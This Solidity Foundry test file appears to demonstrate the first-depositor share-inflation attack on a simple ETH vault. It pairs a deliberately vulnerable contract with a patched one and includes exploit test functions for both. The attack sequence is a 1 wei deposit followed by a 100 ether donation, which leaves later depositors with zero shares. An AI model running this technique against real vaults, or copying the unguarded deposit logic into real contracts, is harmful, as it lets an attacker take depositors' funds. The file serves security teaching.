// SPDX-License-Identifier: UNLICENSED
// thanks to @W2Ning's annotation
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract SimpleFailShare {

    uint256 public totalShares;

    function sharesToEth(uint256 amountShares) public view  returns (uint256) {
        if (totalShares == 0) {
            return amountShares;
        } else {
            return (address(this).balance * amountShares) / totalShares;
        }
    }

    function deposit()
    external
    payable
    returns (uint256 newShares)
    {
        uint256 priorTokenBalance = address(this).balance - msg.value;
        if (priorTokenBalance == 0 || totalShares == 0) {
            newShares = msg.value;
        } else {
            newShares = (msg.value * totalShares) / priorTokenBalance;
        }

        totalShares += newShares;
        return newShares;
    }

    receive() external payable{}
}

contract SimpleFixedShare {

    uint256 public totalShares;

    function sharesToEth(uint256 amountShares) public view  returns (uint256) {
        if (totalShares == 0) {
            return amountShares;
        } else {
            return (address(this).balance * amountShares) / totalShares;
        }
    }

    function deposit()
    external
    payable
    returns (uint256 newShares)
    {
        // exploit code here
        require(msg.value >= 1e18, "value too small");
        uint256 priorTokenBalance = address(this).balance - msg.value;
        if (priorTokenBalance == 0 || totalShares == 0) {
            newShares = msg.value;
        } else {
            newShares = (msg.value * totalShares) / priorTokenBalance;
        }

        totalShares += newShares;
        return newShares;
    }

    receive() external payable{}
}


contract Poc is Test {

    function testExploit() public {
        SimpleFailShare simpleShare = new SimpleFailShare();
        // User1 delegate 1wei ETH
        simpleShare.deposit{value: 1 wei}();

        uint256 sharesToEth1 = simpleShare.sharesToEth(1);

        emit log_named_uint("1 share to how much ETH", sharesToEth1);

        // User1 transfer 100 ether to exploit contract
        payable(simpleShare).transfer(100 ether);

        uint256 sharesToEth2 = simpleShare.sharesToEth(1);

        emit log_named_uint("1 share to how much ETH", sharesToEth2);
        // normal User2 delegate 10 ETH
        // then we have share == 0
        uint256 shareUser2 =  simpleShare.deposit{value: 10 ether}();

        emit log_named_uint("User2 get share", shareUser2);

        // normal User3 delegate 10 ETH
        // then we also have share == 0
        uint256 shareUser3 =  simpleShare.deposit{value: 10 ether}();

        emit log_named_uint("User3 get share", shareUser3);
    }

    function testFixed() public {
        SimpleFixedShare simpleShare = new SimpleFixedShare();
        // User1 delegate 1wei ETH
        simpleShare.deposit{value: 1 wei}();

        uint256 sharesToEth1 = simpleShare.sharesToEth(1);

        emit log_named_uint("1 share to how much ETH", sharesToEth1);

        // User1 transfer 100 ether to exploit contract
        payable(simpleShare).transfer(100 ether);


        uint256 sharesToEth2 = simpleShare.sharesToEth(1);

        emit log_named_uint("1 share to how much ETH", sharesToEth2);
        // normal User2 delegate 10 ETH
        // then we have share == 0
        uint256 shareUser2 =  simpleShare.deposit{value: 10 ether}();

        emit log_named_uint("User2 get share", shareUser2);

        // normal User3 delegate 10 ETH
        // then we also have share == 0
        uint256 shareUser3 = simpleShare.deposit{value: 10 ether}();
        emit log_named_uint("User3 get share", shareUser3);
    }

    function testDeposit() public {
        SimpleFixedShare simpleShare = new SimpleFixedShare();
        // User1 delegate 1wei ETH
        simpleShare.deposit{value: 1 ether}();

        uint256 sharesToEth1 = simpleShare.sharesToEth(1);

        emit log_named_uint("1 share to how much ETH", sharesToEth1);

        // User1 transfer 100 ether to exploit contract
        payable(simpleShare).transfer(100 ether);


        uint256 sharesToEth2 = simpleShare.sharesToEth(1);

        emit log_named_uint("1 share to how much ETH", sharesToEth2);
        // normal User2 delegate 10 ETH
        // then we have share == 0
        uint256 shareUser2 =  simpleShare.deposit{value: 10 ether}();

        emit log_named_uint("User2 get share", shareUser2);

        // normal User3 delegate 10 ETH
        // then we also have share == 0
        uint256 shareUser3 = simpleShare.deposit{value: 10 ether}();
        emit log_named_uint("User3 get share", shareUser3);
    }
}
